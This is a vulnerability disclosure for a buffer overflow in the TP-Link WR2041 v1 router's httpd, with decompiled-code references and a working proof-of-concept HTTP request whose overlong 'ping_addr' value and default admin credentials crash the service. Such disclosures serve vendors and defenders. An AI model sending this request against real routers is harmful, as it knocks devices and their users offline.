## TP-Link WR2041 v1

### Overview

A buffer overflow vulnerability in the TP-Link WR2041 v1 firmware allows an authorized attacker to cause a denial-of-service (DoS) attack by sending an HTTP request with a very long "ping_addr" parameter to the `/userRpm/PingIframeRpm.htm` webpage, potentially crashing the router.

### Vul Details

The trigger point is located in the `sub_47A614` method of the `httpd` component.

![](../main/images/2026-02-02-11-57-54-image.png)

By obtaining `ping_addr` from the request parameters and constructing `doType` with the parameter `ping` and `isNew` with the parameter `new`, the program can execute the following code.

![](../main/images/2026-02-02-12-01-23-image.png)

The vulnerability is located in the `ipAddrDispose` method.

![](../main/images/2026-02-02-12-02-25-image.png)

This function only checks if there is an empty character in `ping_addr`, but does not check the length. Then, the value of `ping_addr` is written to the v21 array in a byte-by-byte loop. v21 has a length of only 52 bytes, and exceeding this length will cause an overflow.

### POC

```http
GET /userRpm/PingIframeRpm.htm?ping_addr=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Authorization: Basic YWRtaW46YWRtaW4=

Connection: close

Referer: http://192.168.1.1/userRpm/WzdWanTypeRpm.htm

Upgrade-Insecure-Requests: 1

Priority: u=4
```

After the PoC was executed, the `httpd` service became inaccessible and crashed.

